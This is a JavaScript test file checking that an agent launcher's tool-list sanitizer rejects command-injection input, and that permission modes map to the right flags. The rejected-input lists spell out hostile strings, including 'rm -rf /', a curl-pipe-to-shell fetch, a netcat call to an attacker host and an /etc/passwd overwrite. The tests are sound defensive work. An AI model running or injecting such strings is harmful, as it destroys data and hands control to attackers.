// Security tests for sanitizeAllowedTools: the value passed to `--allowedTools`
// is interpolated into the agent launch command string, so it MUST reject shell
// metacharacters (no command injection) while keeping valid tool specs.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { sanitizeAllowedTools, permModeToFlag } from '../src/server/pty.js';

// permModeToFlag: 'dangerouslySkip' must map to the --dangerously-skip-permissions
// FLAG (no startup confirmation, fully unattended), other valid modes to
// --permission-mode, and unknown modes to nothing.
test('permModeToFlag maps dangerouslySkip to the flag, others to --permission-mode', () => {
  assert.equal(permModeToFlag('dangerouslySkip'), ' --dangerously-skip-permissions');
  assert.equal(permModeToFlag('acceptEdits'), ' --permission-mode acceptEdits');
  assert.equal(permModeToFlag('bypassPermissions'), ' --permission-mode bypassPermissions');
  assert.equal(permModeToFlag('dontAsk'), ' --permission-mode dontAsk');
  assert.equal(permModeToFlag('auto'), ' --permission-mode auto');
  assert.equal(permModeToFlag('nonsense'), '');
  assert.equal(permModeToFlag(''), '');
});

test('keeps valid tool names and command-prefix patterns', () => {
  assert.equal(
    sanitizeAllowedTools(['Bash(ffmpeg *)', 'Bash(git *)', 'Read', 'Write', 'Edit']),
    'Bash(ffmpeg *) Bash(git *) Read Write Edit',
  );
});

test('drops entries containing shell metacharacters (injection vectors)', () => {
  const dangerous = [
    '"; rm -rf / #',
    '$(whoami)',
    '`id`',
    '&& curl evil.sh | sh',
    '| nc attacker 1',
    '> /etc/passwd',
    'a"b',
    "x'y",
    '%PATH%',
    'foo\nbar',
  ];
  for (const d of dangerous) {
    assert.equal(sanitizeAllowedTools([d]), '', `should reject: ${JSON.stringify(d)}`);
  }
});

test('keeps the safe entries and drops the dangerous ones in a mixed list', () => {
  assert.equal(
    sanitizeAllowedTools(['Read', 'rm -rf /; echo $(id)', 'Bash(ffmpeg *)']),
    'Read Bash(ffmpeg *)',
  );
});

test('returns empty string for empty / whitespace input', () => {
  assert.equal(sanitizeAllowedTools([]), '');
  assert.equal(sanitizeAllowedTools(['', '   ']), '');
});

test('caps overall length to avoid an unbounded command line', () => {
  const huge = Array.from({ length: 200 }, () => 'Read');
  assert.ok(sanitizeAllowedTools(huge).length <= 800);
});
